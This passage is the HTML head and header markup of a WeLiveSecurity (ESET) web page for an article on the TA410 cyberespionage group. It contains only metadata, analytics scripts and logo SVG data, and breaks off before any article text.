<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
            <link rel="canonical" href="https://www.welivesecurity.com/2022/04/27/lookback-ta410-umbrella-cyberespionage-ttps-activity/"><title>A lookback under the TA410 umbrella: Its cyberespionage TTPs and activity</title><meta content="A lookback under the TA410 umbrella: Its cyberespionage TTPs and activity" property="og:title"><meta content="" property="og:image"><meta content="ESET research reveals a detailed profile of TA410, a cyberespionage umbrella group that we believe consists of three different teams using different toolsets." property="og:description"><meta content="https://www.welivesecurity.com/2022/04/27/lookback-ta410-umbrella-cyberespionage-ttps-activity/" property="og:url"><meta content="article" property="og:type"><meta name="robots" content="index, follow, max-image-preview:large, max-video-preview:-1"><meta name="description" content="ESET research reveals a detailed profile of TA410, a cyberespionage umbrella group that we believe consists of three different teams using different toolsets."><meta name="twitter:title" content="A lookback under the TA410 umbrella: Its cyberespionage TTPs and activity"><meta name="twitter:description" content="ESET researchers reveal a detailed profile of TA410: we believe this cyberespionage umbrella group consists of three different teams using different toolsets, including a new version of the FlowCloud espionage backdoor discovered by ESET."><meta name="twitter:image" content="https://web-assets.esetstatic.com/wls/2022/04/ta410-apt-cyberespionage-malware-research.jpg"><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@welivesecurity"><meta name="twitter:creator" content="@welivesecurity"><meta name="twitter:url" content="https://www.welivesecurity.com/2022/04/27/lookback-ta410-umbrella-cyberespionage-ttps-activity/">
    
    <!-- Preloading resources -->
    <link rel="preload" href="https://www.welivesecurity.com/build/assets/FedraSansAltPro-BookLF-405f3258.woff" as="font" type="font/woff" crossorigin>
    <link rel="preload" href="https://www.welivesecurity.com/build/assets/FedraSansAltPro-BoldLF-31f4bc72.woff" as="font" type="font/woff" crossorigin>
    <link rel="preload" href="https://www.welivesecurity.com/build/assets/FedraSansAltPro-DemiLF-8885b886.woff" as="font" type="font/woff" crossorigin>
            <link rel="preload" href="https://web-assets.esetstatic.com/tn/-x266/wls/2022/04/ta410-apt-cyberespionage-malware-research.jpg" as="image" media="(max-width: 768px)">
        <link rel="preload" href="https://web-assets.esetstatic.com/tn/-x425/wls/2022/04/ta410-apt-cyberespionage-malware-research.jpg" as="image" media="(min-width: 768.1px)">
                <link rel="modulepreload" href="https://www.welivesecurity.com/build/assets/article-header-4f98b0a2.js" /><script type="module" src="https://www.welivesecurity.com/build/assets/article-header-4f98b0a2.js"></script>
    <script>
    window.addEventListener('pageLoaded', () => {
        window.dispatchEvent(new CustomEvent('postPageViewed', {
            detail: {
                'id': 6191,
                'publicationId': 11695,
                'name': 'A lookback under the TA410 umbrella: Its cyberespionage TTPs and activity',
                'author': 'Alexandre Côté Cyr',
                'category': 'ESET Research',
                'section': null,
                'branch': 'en',
                'date': '2022/04/27'
            }
        }));
    });
    </script>

    <!-- Google Tag Manager -->
    <script type="module">
    window.addEventListener("pageLoaded", () => {
        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        '//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
        })(window,document,'script','dataLayer','GTM-PMDGSM');
    });
    </script>
    <!-- End Google Tag Manager -->

    <script type="module">
    window.dispatchEvent(new CustomEvent("pageLoaded"));
    </script>

    <!-- Styles -->
    <link rel="preload" as="style" href="https://www.welivesecurity.com/build/assets/app-c4cc4fd9.css" /><link rel="stylesheet" href="https://www.welivesecurity.com/build/assets/app-c4cc4fd9.css" />
    <!-- Others -->
            <script>
            window.$current_language = JSON.parse('{"id":1,"code":"en","name":"English","is_pblic":true,"is_active":true,"is_default":true,"is_rtl":false}');
        </script>
    
<script>(window.BOOMR_mq=window.BOOMR_mq||[]).push(["addVar",{"rua.upush":"false","rua.cpush":"true","rua.upre":"false","rua.cpre":"false","rua.uprl":"false","rua.cprl":"false","rua.cprf":"false","rua.trans":"SJ-0ca156f4-8b61-45fd-865b-d535f4c16b13","rua.cook":"false","rua.ims":"false","rua.ufprl":"false","rua.cfprl":"false","rua.isuxp":"false","rua.texp":"norulematch","rua.ceh":"false","rua.ueh":"false","rua.ieh.st":"0"}]);</script>
                              <script>!function(e){var n="https://s.go-mpulse.net/boomerang/";if("False"=="True")e.BOOMR_config=e.BOOMR_config||{},e.BOOMR_config.PageParams=e.BOOMR_config.PageParams||{},e.BOOMR_config.PageParams.pci=!0,n="https://s2.go-mpulse.net/boomerang/";if(window.BOOMR_API_key="7R9SM-QGSYF-QDLJK-UETXR-SPM6B",function(){function e(){if(!o){var e=document.createElement("script");e.id="boomr-scr-as",e.src=window.BOOMR.url,e.async=!0,i.parentNode.appendChild(e),o=!0}}function t(e){o=!0;var n,t,a,r,d=document,O=window;if(window.BOOMR.snippetMethod=e?"if":"i",t=function(e,n){var t=d.createElement("script");t.id=n||"boomr-if-as",t.src=window.BOOMR.url,BOOMR_lstart=(new Date).getTime(),e=e||d.body,e.appendChild(t)},!window.addEventListener&&window.attachEvent&&navigator.userAgent.match(/MSIE [67]\./))return window.BOOMR.snippetMethod="s",void t(i.parentNode,"boomr-async");a=document.createElement("IFRAME"),a.src="about:blank",a.title="",a.role="presentation",a.loading="eager",r=(a.frameElement||a).style,r.width=0,r.height=0,r.border=0,r.display="none",i.parentNode.appendChild(a);try{O=a.contentWindow,d=O.document.open()}catch(_){n=document.domain,a.src="javascript:var d=document.open();d.domain='"+n+"';void(0);",O=a.contentWindow,d=O.document.open()}if(n)d._boomrl=function(){this.domain=n,t()},d.write("<bo"+"dy onload='document._boomrl();'>");else if(O._boomrl=function(){t()},O.addEventListener)O.addEventListener("load",O._boomrl,!1);else if(O.attachEvent)O.attachEvent("onload",O._boomrl);d.close()}function a(e){window.BOOMR_onload=e&&e.timeStamp||(new Date).getTime()}if(!window.BOOMR||!window.BOOMR.version&&!window.BOOMR.snippetExecuted){window.BOOMR=window.BOOMR||{},window.BOOMR.snippetStart=(new Date).getTime(),window.BOOMR.snippetExecuted=!0,window.BOOMR.snippetVersion=12,window.BOOMR.url=n+"7R9SM-QGSYF-QDLJK-UETXR-SPM6B";var i=document.currentScript||document.getElementsByTagName("script")[0],o=!1,r=document.createElement("link");if(r.relList&&"function"==typeof r.relList.supports&&r.relList.supports("preload")&&"as"in r)window.BOOMR.snippetMethod="p",r.href=window.BOOMR.url,r.rel="preload",r.as="script",r.addEventListener("load",e),r.addEventListener("error",function(){t(!0)}),setTimeout(function(){if(!o)t(!0)},3e3),BOOMR_lstart=(new Date).getTime(),i.parentNode.appendChild(r);else t(!1);if(window.addEventListener)window.addEventListener("load",a,!1);else if(window.attachEvent)window.attachEvent("onload",a)}}(),"".length>0)if(e&&"performance"in e&&e.performance&&"function"==typeof e.performance.setResourceTimingBufferSize)e.performance.setResourceTimingBufferSize();!function(){if(BOOMR=e.BOOMR||{},BOOMR.plugins=BOOMR.plugins||{},!BOOMR.plugins.AK){var n="true"=="true"?1:0,t="",a="at3iojaxh3tbg2ek3zba-f-05deefbbc-clientnsv4-s.akamaihd.net",i="false"=="true"?2:1,o={"ak.v":"39","ak.cp":"1251022","ak.ai":parseInt("757730",10),"ak.ol":"0","ak.cr":2,"ak.ipv":4,"ak.proto":"http/1.1","ak.rid":"58c38d2","ak.r":38220,"ak.a2":n,"ak.m":"dscr","ak.n":"ff","ak.bpcip":"4.246.135.0","ak.cport":24577,"ak.gh":"23.61.10.19","ak.quicv":"","ak.tlsv":"tls1.3","ak.0rtt":"","ak.0rtt.ed":"","ak.csrc":"-","ak.acc":"bbr","ak.t":"1753931330","ak.ak":"hOBiQwZUYzCg5VSAfCLimQ==mYS85lCrzhKvdozqXuPjm0gqIpngiyb0nVlpcOHX2OwoKVeQwS/aHJd7906XXOftx6LdwQyqWTsVmySPInq56vqXpeBD6De0Ml5Ct8ola2//CgKNKj62vn0JqX6vec3W+RWT3gd59M9qtlql7P+GXFf8IU3IFhcG19px5zklxS6JqYPKhZSMYaIBlLyloTC3YDvl6LKLy+T9NZxaDvDrL8rJ1/4DFVL+P4IZHmzCKaFCtCIFnaoFXrO+0M4J6c0vO0JBOXNunytvuqh0WayyxDg/cg5Sb/b/aXV/uvqxwkQfC0r28O2UBAKqBqGpOpa7snG0xfA0qt6oiRS3mPobdhxKRN6tQvgTH9OKAj6jAOeXiMRvySUyJCzxJ02w0/vH8Z295ZKvZQWbs3yyB59fYDoHUz8bhBnYIw2kcdTb5rI=","ak.pv":"20","ak.dpoabenc":"","ak.tf":i};if(""!==t)o["ak.ruds"]=t;var r={i:!1,av:function(n){var t="http.initiator";if(n&&(!n[t]||"spa_hard"===n[t]))o["ak.feo"]=void 0!==e.aFeoApplied?1:0,BOOMR.addVar(o)},rv:function(){var e=["ak.bpcip","ak.cport","ak.cr","ak.csrc","ak.gh","ak.ipv","ak.m","ak.n","ak.ol","ak.proto","ak.quicv","ak.tlsv","ak.0rtt","ak.0rtt.ed","ak.r","ak.acc","ak.t","ak.tf"];BOOMR.removeVar(e)}};BOOMR.plugins.AK={akVars:o,akDNSPreFetchDomain:a,init:function(){if(!r.i){var e=BOOMR.subscribe;e("before_beacon",r.av,null,null),e("onbeacon",r.rv,null,null),r.i=!0}return this},is_complete:function(){return!0}}}}()}(window);</script></head>
<body>
    <!-- Google Tag Manager (noscript) -->
    <noscript>
        <iframe src=https://www.googletagmanager.com/ns.html?id=GTM-PMDGSM height="0" width="0" style="display:none;visibility:hidden"></iframe>
    </noscript>
    <!-- End Google Tag Manager (noscript) -->
    
    <div id="app" >
        <!-- navbar -->
        <header id="wls-nav-header" class="wls-header navbar sticky-top navbar-expand-lg has-shadow">
  <div class="container first-line">
    <a class="header-brand" href="/en/" title="WeLiveSecurity">
      <?xml version="1.0" encoding="UTF-8"?><svg id="Layer_2" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 290 31.7919"><defs><style>.cls-1{fill:#0b8690;}.cls-2{fill:#053b44;}</style></defs><g id="Layer_1-2"><g><path class="cls-2" d="M0,8.6081H5.1069l2.869,10.7299,3.3282-10.845h4.3616l3.3833,10.845,2.9261-10.7879h4.9947l-5.51,17.8465h-4.5336l-3.3833-10.903-3.5012,10.903H5.451L0,8.6081Zm26.6257,9.0093h0c0-5.1069,3.6153-9.2964,8.7792-9.2964,5.9102,0,8.6651,4.5907,8.6651,9.6405,0,.4021-.057,.8603-.057,1.3195h-12.3955c.3233,2.123,2.219,3.6443,4.3616,3.5003,1.6303,.0269,3.1951-.6409,4.3036-1.8367l2.8729,2.5259c-1.7441,2.1958-4.4284,3.4313-7.2306,3.3282-4.9064,.227-9.0678-3.5664-9.2947-8.4728-.0109-.236-.0124-.4724-.0045-.7085Zm12.5095-1.4916c-.29-2.2378-1.6066-3.7874-3.7303-3.7874s-3.4432,1.4916-3.8444,3.7874h7.5747Zm57.842,7.9179l2.1266-3.3282c1.5999,1.2513,3.5393,1.9923,5.566,2.1267,1.4345,0,2.1266-.5162,2.1266-1.3195v-.057c0-1.0904-1.7216-1.4345-3.6733-2.0658-2.4679-.7463-5.2789-1.8937-5.2789-5.3369v-.057c0-3.6153,2.9261-5.6231,6.4843-5.6231,2.3553,.0234,4.6511,.742,6.5994,2.0658l-1.8937,3.5003c-1.4459-.9422-3.1015-1.5139-4.8207-1.6646-1.2054,0-1.8366,.5162-1.8366,1.2054v.057c0,.9754,1.6646,1.4345,3.6153,2.1267,2.4679,.8033,5.3369,2.0087,5.3369,5.2789v.057c0,3.9633-2.9261,5.7381-6.7666,5.7381-2.7543-.0573-5.4158-1.006-7.5854-2.7037Zm15.4356-6.4264h0c0-5.1069,3.6153-9.2964,8.7792-9.2964,5.9102,0,8.6651,4.5907,8.6651,9.6405,0,.4021-.057,.8603-.057,1.3195h-12.3375c.3233,2.123,2.219,3.6443,4.3616,3.5003,1.6303,.0269,3.1951-.6409,4.3036-1.8367l2.869,2.5249c-1.744,2.1959-4.4283,3.4315-7.2306,3.3282-5.3901,.001-9.3534-3.7835-9.3534-9.1804Zm12.5095-1.4916c-.29-2.2378-1.6066-3.7874-3.7303-3.7874s-3.4432,1.4916-3.8444,3.7874h7.5747Zm6.1412,1.4906h0c-.0992-5.0349,3.9019-9.197,8.9368-9.2964h.3596c2.6878-.1539,5.2947,.9485,7.0566,2.9841l-3.0991,3.3282c-.9721-1.2277-2.4505-1.9458-4.0165-1.9507-2.5249,0-4.3036,2.2378-4.3036,4.8198v.057c0,2.697,1.7787,4.8778,4.4756,4.8778,1.5606-.0446,3.0342-.7295,4.0745-1.8937l2.9261,2.9841c-1.7686,2.1577-4.4423,3.3673-7.2306,3.2712-5.0035,.0682-9.115-3.9326-9.1832-8.9361,0-.0009,0-.0017,0-.0026,.0026-.0806,.0038-.1614,.0039-.2426Zm17.9606,2.5249V8.6642h5.0498v9.8706c0,2.4099,1.1474,3.6153,3.0411,3.6153s3.1562-1.2054,3.1562-3.6153V8.6071h5.0498V26.3386h-5.0498v-2.5249c-1.1459,1.7743-3.1079,2.8527-5.22,2.869-3.7893,.001-6.0271-2.4669-6.0271-6.5414Zm18.4767-11.5342h5.0498v3.5573c1.0324-2.4679,2.697-4.0165,5.6811-3.9024v5.2789h-.29c-3.3282,0-5.3939,2.0087-5.3939,6.2543v6.5414h-5.047V8.6071Zm12.5666,0h5.0498V26.3386h-5.0498V8.6071Zm8.9561,12.7396V12.9117h-2.1267v-4.3036h2.1267V4.0745h5.0498v4.5336h4.1885v4.3036h-4.1924v7.5747c0,1.1474,.5162,1.7216,1.6066,1.7216,.8637,.0094,1.7148-.2083,2.4679-.6312v4.0165c-1.1964,.7132-2.571,1.0716-3.9633,1.0334-3.0952,.057-5.1571-1.2054-5.1571-5.2799Zm11.4153,9.1813l1.6646-3.6153c.6415,.4009,1.372,.6373,2.1267,.6883,.7821,.0558,1.5071-.4118,1.7787-1.1474l-6.9474-17.7885h5.3369l4.0165,12.1074,3.8444-12.1074h5.22l-6.7666,18.1326c-1.3775,3.6153-2.812,4.9928-5.8531,4.9928-1.5664,.0294-3.1059-.4102-4.4205-1.2625ZM182.4783,1.3195c1.3945,0,2.5249,1.1304,2.5249,2.5249s-1.1304,2.5249-2.5249,2.5249-2.5249-1.1304-2.5249-2.5249,1.1304-2.5249,2.5249-2.5249Zm38.8471,2.754v2.1267h-.6312v-2.1267h-.8603v-.5162h2.3528v.4592h-.8603l-.0009,.057Zm4.0755,2.1238v-1.7796l-.8033,1.7787h-.6312l-.7463-1.7787,.057,.3441v1.3775h-.5732V3.5573h.7463l.8603,2.0658,.9753-2.0658h.6883v2.6399h-.5732Z" /><path class="cls-1" d="M46.2508,2.2378h5.0498V26.3956h-5.0498V2.2378Zm7.9189,6.3693h5.0498V26.3386h-5.0498V8.6071Zm6.5414,0h5.3369l3.9633,11.8783,4.0126-11.8783h5.22l-7.0005,17.8465h-4.5907l-6.9416-17.8465Zm17.9035,9.0102h0c0-5.1069,3.6153-9.2964,8.7792-9.2964,5.9102,0,8.6651,4.5907,8.6651,9.6405,0,.4021-.057,.8603-.057,1.3195h-12.3375c.3232,2.1226,2.2184,3.6438,4.3606,3.5003,1.6303,.0269,3.1951-.6409,4.3036-1.8367l2.869,2.5249c-1.744,2.1959-4.4283,3.4315-7.2306,3.3282-5.3891,.001-9.3524-3.7835-9.3524-9.1804Zm12.5095-1.4916c-.29-2.2378-1.6066-3.7874-3.7294-3.7874s-3.4432,1.4916-3.8444,3.7874h7.5738ZM56.6366,0c-1.7746,0-3.2132,1.4386-3.2132,3.2132,0,1.7746,1.4386,3.2132,3.2132,3.2132,1.7746,0,3.2132-1.4386,3.2132-3.2132h0c-.0188-1.7667-1.4464-3.1943-3.2132-3.2132Zm0,4.5907c-.7567-.0094-1.3677-.6208-1.3765-1.3775-.0202-.7605,.58-1.3933,1.3405-1.4135,.7605-.0202,1.3933,.58,1.4135,1.3405,.0006,.0243,.0006,.0487,0,.073-.0089,.7571-.6204,1.3686-1.3775,1.3775Zm191.3425,4.0213c-2.2021-.0287-4.2611,1.0885-5.4375,2.9502-.9299,1.6095-1.1339,4.233-1.1339,5.9711s.2049,4.3596,1.1339,5.9691c1.1767,1.8615,3.2355,2.9785,5.4375,2.9502h34.4972c2.2018,.0283,4.2603-1.0888,5.4365-2.9502,.928-1.6095,1.1349-4.233,1.1349-5.9711s-.2069-4.3567-1.1349-5.9662c-1.1762-1.8615-3.2347-2.9786-5.4365-2.9502l-34.4972-.0029Zm22.9572,7.9392h2.9v-.0899c0-1.3272-.5326-1.4268-1.4896-1.4268-1.16,0-1.3794,.377-1.4133,1.5167m-20.3859-1.4297c.9512,0,1.4635,.0967,1.4635,1.3997v.0628h-2.8487c.0319-1.1165,.2591-1.4626,1.3852-1.4626m-4.0233,2.463c0,3.1262,.783,4.2533,4.0745,4.2533,1.0071,.0751,2.0175-.0927,2.9464-.4891,.7808-.4894,1.2122-1.3829,1.1097-2.2987h-2.5965c-.0271,.8903-.6322,.9821-1.4626,.9821-1.1996,0-1.4336-.4833-1.4336-1.9788v-.0638h5.4887v-.405c0-3.4123-.9231-4.2668-4.06-4.2668-3.3553,0-4.0745,1.044-4.0745,4.2668m9.8793-1.5621c0,1.6665,.5742,2.4476,4.0735,2.4476,.3744-.0275,.7508,.0097,1.1126,.1102,.2736,.1199,.4021,.3586,.4021,.7927,0,.726-.2658,.8043-1.5128,.8043-.6931,0-1.3987-.0155-1.4307-.9502h-2.6438c.0203,1.8425,.8932,2.4447,2.5085,2.5732,.4882,.0377,1.0188,.0348,1.565,.0348,2.2233,0,4.0735-.3712,4.0735-2.7849,0-2.2997-1.1996-2.463-4.0745-2.5288-1.4268-.0319-1.5109-.3316-1.5109-.8043,0-.5616,.0619-.7405,1.5119-.7405,.5317,0,1.0633,.0474,1.1822,.7086h2.4882v-.3393c0-2.001-2.0967-2.03-3.6733-2.03-2.3625,0-4.0735,.0532-4.0735,2.7066m21.6744-2.7066h6.5018v1.9005h-1.9333v6.525h-2.6274v-6.524h-1.9333l-.0077-1.9014Zm-9.7275,4.2059c0-3.2122,.7086-4.2398,4.0464-4.2398,3.1194,0,4.031,.842,4.031,4.2398v.376h-5.4896v.0909c0,1.4945,.2359,2.0058,1.4587,2.0058,.8226,0,1.45-.0909,1.4896-.9821h2.5413c.0948,.8946-.3269,1.7653-1.0875,2.2456-.9243,.3931-1.9294,.5588-2.9309,.4833-3.276,0-4.0464-1.1088-4.0464-4.2224m-23.7624,5.7874c-1.3214-1.421-1.6134-3.652-1.6134-5.7739s.29-4.35,1.6134-5.7758c1.0333-.9868,2.3994-1.5498,3.828-1.5776h17.7865v14.7048h-17.7865c-1.4285-.0278-2.7946-.5908-3.828-1.5776m43.7423-16.12c.0004-.036-.009-.0714-.0271-.1025-.0116-.0387-.0445-.0628-.086-.0899-.0385-.0194-.0807-.0303-.1237-.0319-.0559-.0087-.1126-.0123-.1692-.0106h-.1508v.5394h.115c.0678,.0013,.1357-.0022,.203-.0106,.0495-.0114,.0968-.0307,.1402-.057,.0317-.0265,.0574-.0594,.0754-.0967,.016-.0456,.0235-.0938,.0222-.1421m.8226,1.3533h-.61l-.5742-.7086h-.1933v.7066h-.4679v-1.913h.7269c.1085-.0031,.2172,.0024,.3248,.0164,.0855,.0088,.1681,.0355,.2426,.0783,.0789,.0405,.1456,.1012,.1933,.1759,.0425,.0819,.0625,.1737,.058,.2658,.0044,.1242-.0384,.2454-.1199,.3393-.0832,.0952-.1884,.1685-.3064,.2136l.7259,.8255Zm.4186-.9203c.0053-.4029-.1547-.7903-.4427-1.072-.2749-.2868-.6574-.4452-1.0546-.4369-.3998-.0086-.7851,.1497-1.0633,.4369-.5856,.5955-.5856,1.5505,0,2.146,.5715,.5851,1.5091,.5962,2.0942,.0247,.0083-.0081,.0166-.0164,.0247-.0247,.289-.2818,.4492-.6703,.4427-1.074m.4253,0c.0069,.5131-.1972,1.0066-.5645,1.3649-.7536,.747-1.9685,.747-2.7221,0-.3705-.3563-.5758-.851-.5665-1.3649-.0083-.5104,.1971-1.001,.5665-1.3533,.7441-.75,1.955-.7561,2.7066-.0135l.0135,.0135c.3662,.3543,.5704,.8438,.5645,1.3533m-64.0238,6.7637h2.1044c1.5563,0,2.32,.6206,2.32,1.74,.0109,.539-.2936,1.0349-.7791,1.2692v.0242c.7243,.1716,1.2395,.8131,1.2509,1.5573,0,1.16-.6767,1.9652-2.5133,1.9652h-2.3828v-6.5559Zm2.0483,2.7588c.7414,0,1.1126-.2591,1.1126-.8893,0-.6767-.4456-.899-1.2799-.899h-.6109v1.7883h.7782Zm.2127,2.7898c.87,0,1.362-.2223,1.362-.9261s-.5007-.9667-1.4829-.9667h-.87v1.8908l.9908,.0019Zm4.9406-1.248l-2.32-4.3007h1.4548l1.5418,3.2267,1.6433-3.2248h1.4084l-2.4659,4.2726v2.2775h-1.2566l-.0058-2.2514Z" /></g></g></svg>    </a>
    <p>
      Award-winning news, views, and insight from the ESET security community
    </p>
    <div class="ms-auto">
      <div class="language-picker dropdown"><div class="language-picker-wrapper"><button class="btn dropdown-toggle" type="button" data-bs-toggle="dropdown"aria-expanded="false">English</button><ul class="dropdown-menu dropdown-menu-center"><a class="dropdown-item" href="/es/" title="Español">Español</a><a class="dropdown-item" href="/de/" title="Deutsch">Deutsch</a><a class="dropdown-item" href="/pt/" title="Português">Português</a><a class="dropdown-item" href="/fr/" title="Français">Français</a></ul></div></div>    </div>
  </div>
  <div class="second-line">
    <div class="container">
      <div class="navbar-header">
        <a class="header-brand" href="/en/" title="WeLiveSecurity">
          <?xml version="1.0" encoding="UTF-8"?><svg id="Layer_2" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 290 31.7919"><defs><style>.cls-1{fill:#0b8690;}.cls-2{fill:#053b44;}</style></defs><g id="Layer_1-2"><g><path class="cls-2" d="M0,8.6081H5.1069l2.869,10.7299,3.3282-10.845h4.3616l3.3833,10.845,2.9261-10.7879h4.9947l-5.51,17.8465h-4.5336l-3.3833-10.903-3.5012,10.903H5.451L0,8.6081Zm26.6257,9.0093h0c0-5.1069,3.6153-9.2964,8.7792-9.2964,5.9102,0,8.6651,4.5907,8.6651,9.6405,0,.4021-.057,.8603-.057,1.3195h-12.3955c.3233,2.123,2.219,3.6443,4.3616,3.5003,1.6303,.0269,3.1951-.6409,4.3036-1.8367l2.8729,2.5259c-1.7441,2.1958-4.4284,3.4313-7.2306,3.3282-4.9064,.227-9.0678-3.5664-9.2947-8.4728-.0109-.236-.0124-.4724-.0045-.7085Zm12.5095-1.4916c-.29-2.2378-1.6066-3.7874-3.7303-3.7874s-3.4432,1.4916-3.8444,3.7874h7.5747Zm57.842,7.9179l2.1266-3.3282c1.5999,1.2513,3.5393,1.9923,5.566,2.1267,1.4345,0,2.1266-.5162,2.1266-1.3195v-.057c0-1.0904-1.7216-1.4345-3.6733-2.0658-2.4679-.7463-5.2789-1.8937-5.2789-5.3369v-.057c0-3.6153,2.9261-5.6231,6.4843-5.6231,2.3553,.0234,4.6511,.742,6.5994,2.0658l-1.8937,3.5003c-1.4459-.9422-3.1015-1.5139-4.8207-1.6646-1.2054,0-1.8366,.5162-1.8366,1.2054v.057c0,.9754,1.6646,1.4345,3.6153,2.1267,2.4679,.8033,5.3369,2.0087,5.3369,5.2789v.057c0,3.9633-2.9261,5.7381-6.7666,5.7381-2.7543-.0573-5.4158-1.006-7.5854-2.7037Zm15.4356-6.4264h0c0-5.1069,3.6153-9.2964,8.7792-9.2964,5.9102,0,8.6651,4.5907,8.6651,9.6405,0,.4021-.057,.8603-.057,1.3195h-12.3375c.3233,2.123,2.219,3.6443,4.3616,3.5003,1.6303,.0269,3.1951-.6409,4.3036-1.8367l2.869,2.5249c-1.744,2.1959-4.4283,3.4315-7.2306,3.3282-5.3901,.001-9.3534-3.7835-9.3534-9.1804Zm12.5095-1.4916c-.29-2.2378-1.6066-3.7874-3.7303-3.7874s-3.4432,1.4916-3.8444,3.7874h7.5747Zm6.1412,1.4906h0c-.0992-5.0349,3.9019-9.197,8.9368-9.2964h.3596c2.6878-.1539,5.2947,.9485,7.0566,2.9841l-3.0991,3.3282c-.9721-1.2277-2.4505-1.9458-4.0165-1.9507-2.5249,0-4.3036,2.2378-4.3036,4.8198v.057c0,2.697,1.7787,4.8778,4.4756,4.8778,1.5606-.0446,3.0342-.7295,4.0745-1.8937l2.9261,2.9841c-1.7686,2.1577-4.4423,3.3673-7.2306,3.2712-5.0035,.0682-9.115-3.9326-9.1832-8.9361,0-.0009,0-.0017,0-.0026,.0026-.0806,.0038-.1614,.0039-.2426Zm17.9606,2.5249V8.6642h5.0498v9.8706c0,2.4099,1.1474,3.6153,3.0411,3.6153s3.1562-1.2054,3.1562-3.6153V8.6071h5.0498V26.3386h-5.0498v-2.5249c-1.1459,1.7743-3.1079,2.8527-5.22,2.869-3.7893,.001-6.0271-2.4669-6.0271-6.5414Zm18.4767-11.5342h5.0498v3.5573c1.0324-2.4679,2.697-4.0165,5.6811-3.9024v5.2789h-.29c-3.3282,0-5.3939,2.0087-5.3939,6.2543v6.5414h-5.047V8.6071Zm12.5666,0h5.0498V26.3386h-5.0498V8.6071Zm8.9561,12.7396V12.9117h-2.1267v-4.3036h2.1267V4.0745h5.0498v4.5336h4.1885v4.3036h-4.1924v7.5747c0,1.1474,.5162,1.7216,1.6066,1.7216,.8637,.0094,1.7148-.2083,2.4679-.6312v4.0165c-1.1964,.7132-2.571,1.0716-3.9633,1.0334-3.0952,.057-5.1571-1.2054-5.1571-5.2799Zm11.4153,9.1813l1.6646-3.6153c.6415,.4009,1.372,.6373,2.1267,.6883,.7821,.0558,1.5071-.4118,1.7787-1.1474l-6.9474-17.7885h5.3369l4.0165,12.1074,3.8444-12.1074h5.22l-6.7666,18.1326c-1.3775,3.6153-2.812,4.9928-5.8531,4.9928-1.5664,.0294-3.1059-.4102-4.4205-1.2625ZM182.4783,1.3195c1.3945,0,2.5249,1.1304,2.5249,2.5249s-1.1304,2.5249-2.5249,2.5249-2.5249-1.1304-2.5249-2.5249,1.1304-2.5249,2.5249-2.5249Zm38.8471,2.754v2.1267h-.6312v-2.1267h-.8603v-.5162h2.3528v.4592h-.8603l-.0009,.057Zm4.0755,2.1238v-1.7796l-.8033,1.7787h-.6312l-.7463-1.7787,.057,.3441v1.3775h-.5732V3.5573h.7463l.8603,2.0658,.9753-2.0658h.6883v2.6399h-.5732Z" /><path class="cls-1" d="M46.2508,2.2378h5.0498V26.3956h-5.0498V2.2378Zm7.9189,6.3693h5.0498V26.3386h-5.0498V8.6071Zm6.5414,0h5.3369l3.9633,11.8783,4.0126-11.8783h5.22l-7.0005,17.8465h-4.5907l-6.9416-17.8465Zm17.9035,9.0102h0c0-5.1069,3.6153-9.2964,8.7792-9.2964,5.9102,0,8.6651,4.5907,8.6651,9.6405,0,.4021-.057,.8603-.057,1.3195h-12.3375c.3232,2.1226,2.2184,3.6438,4.3606,3.5003,1.6303,.0269,3.1951-.6409,4.3036-1.8367l2.869,2.5249c-1.744,2.1959-4.4283,3.4315-7.2306,3.3282-5.3891,.001-9.3524-3.7835-9.3524-9.1804Zm12.5095-1.4916c-.29-2.2378-1.6066-3.7874-3.7294-3.7874s-3.4432,1.4916-3.8444,3.7874h7.5738ZM56.6366,0c-1.7746,0-3.2132,1.4386-3.2132,3.2132,0,1.7746,1.4386,3.2132,3.2132,3.2132,1.7746,0,3.2132-1.4386,3.2132-3.2132h0c-.0188-1.7667-1.4464-3.1943-3.2132-3.2132Zm0,4.5907c-.7567-.0094-1.3677-.6208-1.3765-1.3775-.0202-.7605,.58-1.3933,1.3405-1.4135,.7605-.0202,1.3933,.58,1.4135,1.3405,.0006,.0243,.0006,.0487,0,.073-.0089,.7571-.6204,1.3686-1.3775,1.3775Zm191.3425,4.0213c-2.2021-.0287-4.2611,1.0885-5.4375,2.9502-.9299,1.6095-1.1339,4.233-1.1339,5.9711s.2049,4.3596,1.1339,5.9691c1.1767,1.8615,3.2355,2.9785,5.4375,2.9502h34.4972c2.2018,.0283,4.2603-1.0888,5.4365-2.9502,.928-1.6095,1.1349-4.233,1.1349-5.9711s-.2069-4.3567-1.1349-5.9662c-1.1762-1.8615-3.2347-2.9786-5.4365-2.9502l-34.4972-.0029Zm22.9572,7.9392h2.9v-.0899c0-1.3272-.5326-1.4268-1.4896-1.4268-1.16,0-1.3794,.377-1.4133,1.5167m-20.3859-1.4297c.9512,0,1.4635,.0967,1.4635,1.3997v.0628h-2.8487c.0319-1.1165,.2591-1.4626,1.3852-1.4626m-4.0233,2.463c0,3.1262,.783,4.2533,4.0745,4.2533,1.0071,.0751,2.0175-.0927,2.9464-.4891,.7808-.4894,1.2122-1.3829,1.1097-2.2987h-2.5965c-.0271,.8903-.6322,.9821-1.4626,.9821-1.1996,0-1.4336-.4833-1.4336-1.9788v-.0638h5.4887v-.405c0-3.4123-.9231-4.2668-4.06-4.2668-3.3553,0-4.0745,1.044-4.0745,4.2668m9.8793-1.5621c0,1.6665,.5742,2.4476,4.0735,2.4476,.3744-.0275,.7508,.0097,1.1126,.1102,.2736,.1199,.4021,.3586,.4021,.7927,0,.726-.2658,.8043-1.5128,.8043-.6931,0-1.3987-.0155-1.4307-.9502h-2.6438c.0203,1.8425,.8932,2.4447,2.5085,2.5732,.4882,.0377,1.0188,.0348,1.565,.0348,2.2233,0,4.0735-.3712,4.0735-2.7849,0-2.2997-1.1996-2.463-4.0745-2.5288-1.4268-.0319-1.5109-.3316-1.5109-.8043,0-.5616,.0619-.7405,1.5119-.7405,.5317,0,1.0633,.0474,1.1822,.7086h2.4882v-.3393c0-2.001-2.0967-2.03-3.6733-2.03-2.3625,0-4.0735,.0532-4.0735,